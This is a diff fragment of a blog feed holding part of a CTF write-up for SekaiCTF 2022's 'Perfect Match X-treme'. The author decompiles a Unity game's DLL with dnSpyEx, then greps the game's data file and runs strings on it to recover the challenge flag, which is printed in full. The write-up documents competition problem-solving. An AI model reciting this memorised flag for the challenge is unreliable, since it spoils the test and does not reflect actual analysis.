-<p><img src="/assets/image/sekaictf-2022-writeup/perfect-match-x-treme-eliminated.png" alt="Eliminated screen." /></p>
-
-<p>Examining the files, and reading <a href="https://github.com/imadr/Unity-game-hacking">some guide</a>, I identified <code class="highlighter-rouge">/PerfectMatch_Data/Managed/Assembly-CSharp.dll</code> would be the interesting file that contains the game’s logic (<code class="highlighter-rouge">Assembly-UnityScript.dll</code> would be interesting too if it exists according to the guide).</p>
-
-<p>The next step is to use decompiler for .NET or Unity. I tried to decompile the DLL file with dotPeak, ILSpy and dnSpyEx, and they all worked. I used primarily <a href="https://github.com/dnSpyEx/dnSpy">dnSpyEx</a> during this challenge.</p>
-
-<p>Opening the DLL in dnSpyEx, <code class="highlighter-rouge">GameManager</code> contains the logic of choosing fruits for each round. Browsing around content in the DLL, I find the code for showing the flag is in UI. The screenshot of the content of the decompiled DLL and content of UI is shown below:</p>
-
-<p><img src="/assets/image/sekaictf-2022-writeup/perfect-match-x-treme-decompile-ui.png" alt="Decompiled Assembly-UnityScript.dll content." /></p>
-
-<p>The flag appeared to be 3 pieces of text putting together, I guessed it could be 3 pieces of strings stored in some data file, which might be <code class="highlighter-rouge">/PerfectMatch_Data/level0</code>. To check further, I used <code class="highlighter-rouge">grep -r "SEKAI{" .</code>, and it returned <code class="highlighter-rouge">grep: ./PerfectMatch_Data/level0: binary file matches</code>. Then I used <code class="highlighter-rouge">strings</code> to extract the strings of the flag, and find this part of the output looks like the strings for the flag:</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SEKAI{F4LL_GUY5_
-fff?fff?
-Qualified!
-1LL3G4L}
-H3CK_15_
-</code></pre></div></div>
-
-<p>Putting the 3 parts together, got the flag <code class="highlighter-rouge">SEKAI{F4LL_GUY5_H3CK_15_1LL3G4L}</code>.</p>]]></content><author><name></name></author><category term="ctf" /><category term="ctf writeup" /><summary type="html"><![CDATA[Note: Some of the links to external sites about the challenge in this post might become unavailable in the future.]]></summary></entry></feed>
+</code></pre></div></div>]]></content><author><name></name></author><category term="ctf" /><category term="ctf writeup" /><category term="ctf web" /><summary type="html"><![CDATA[Note: Some of the links to external sites about the challenge in this post might become unavailable in the future.]]></summary></entry></feed>
